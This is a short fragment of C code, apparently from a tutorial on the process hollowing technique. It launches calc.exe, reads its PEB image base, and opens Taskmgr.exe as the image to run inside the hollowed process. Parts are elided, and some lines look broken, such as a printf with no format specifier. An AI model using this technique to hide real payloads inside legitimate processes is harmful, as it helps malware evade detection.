...
int main()
{
	...
	CreateProcessA(NULL, (LPSTR)"C:/Windows/System32/calc.exe", NULL, NULL, TRUE, 0, NULL, NULL, si, pi);
	...
	DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 10;
	...
	printf("destination image base address: ", pebImageBaseOffset);

     // read source file - this is the file that will be executed inside the hollowed process
     HANDLE sourceFile = CreateFileA("c:/Windows/System32/Taskmgr.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
